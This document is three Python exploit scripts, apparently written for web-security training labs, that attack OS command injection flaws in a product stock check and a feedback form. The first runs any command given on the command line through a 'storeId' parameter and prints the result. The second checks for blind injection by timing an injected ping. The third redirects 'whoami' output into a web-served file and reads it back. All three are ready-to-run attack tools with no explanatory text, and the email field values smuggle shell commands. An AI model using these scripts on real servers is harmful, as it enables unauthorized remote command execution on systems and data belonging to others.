```python
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Send the requests through Burp to be able to examine them
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def run_command(url: str, command: str):
    stock_path = '/product/stock'
    command_injection = '1 && ' + command
    params = {'productId': '1', 'storeId': command_injection}
    r = requests.post(url + stock_path, data=params, verify=False, proxies=proxies)
    if (len(r.text) > 3):
        print(f"(+) Command injection succesful!")
        print(f"(+) Output of command:\n{r.text}")
    else:
        print("(-) Command injection failed.")

def main():
    # Check the number of arguments to the program is correct
    if len(sys.argv) != 3:
        print(f"(-) Usage: {sys.argv[0]} <url> <command>")
        print(f"(-) Example: {sys.argv[0]} www.example.com whoami")
        sys.exit(1)

    url = sys.argv[1]
    command = sys.argv[2]
    print(f"(+) Exploiting command injection...")
    run_command(url, command)

if __name__ == '__main__':
    main()

```

```python
import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = { 'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080' }

def get_crsf(s, url):
    feedback_path = "/feedback"
    r = s.get(url + feedback_path, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find('input')['value']
    return csrf

def check_command_injection(s, url):
    submit_feedback_path = "/feedback/submit"
    command_injection = "test@test.com; ping -c 10 localhost #"
    csrf_token = get_crsf(s, url)   # Retrieve CSRF in order to send a valid request
    data = { 'csrf': csrf_token, 'name': "test", 'email': command_injection,
            'subject': "testing", 'message': "This is a test"}
    res = s.post(url + submit_feedback_path, data=data, verify=False, proxies=proxies)
    if (res.elapsed.total_seconds() >= 10):
        print("(+) Email field vulnerable to time-based command injection")
    else:
        print("(-) Email field not vulnerable to time-based command injection")

def main():
    if len(sys.argv) != 2:
        print(f"(-) Usage: {sys.argv[0]} <url>")
        print(f"(-) Example: {sys.argv[0]} www.example.com")
        sys.exit(1)

    url = sys.argv[1]
    print("(+) Checking if email parameter is vulnerable to time-based command injection...")

    s = requests.Session()
    check_command_injection(s, url)


if __name__ == '__main__':
    main()
```

```python
import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = { 'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080' }

# Get the CSRF in the /feedback page before exploiting the form vulnerability
def get_csrf(s, url):
    feedback_path = "/feedback"
    r = s.get(url + feedback_path, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find('input')['value']
    return csrf

def check_command_injection(s, url):
    submit_feedback_path = "/feedback/submit"
    command_injection = "test@test.com; whoami > /var/www/images/output-py.txt #"
    csrf_token = get_csrf(s, url)   # Retrieve CSRF in order to send a valid request
    data = { 'csrf': csrf_token, 'name': "test", 'email': command_injection,
            'subject': "testing", 'message': "This is a test"}
    res = s.post(url + submit_feedback_path, data=data, verify=False, proxies=proxies)
    print("(+) Verifying if command injection exploit worked...")

    # Verify command injection
    file_path = "/image?filename=output-py.txt"
    res = s.get(url + file_path, verify=False, proxies=proxies)
    if (res.status_code == 200): # All good
        print("(+) Command injection succesful!")
        print(f"(+) The following is the content of the command: {res.text}")
    else:
        print("(-) Command injection was not succesful.")

def main():
    if len(sys.argv) != 2:
        print(f"(-) Usage: {sys.argv[0]} <url>")
        print(f"(-) Example: {sys.argv[0]} www.example.com")
        sys.exit(1)

    url = sys.argv[1]
    print("(+) Exploiting blind command injection in email field...")

    s = requests.Session()
    check_command_injection(s, url)


if __name__ == '__main__':
    main()
```

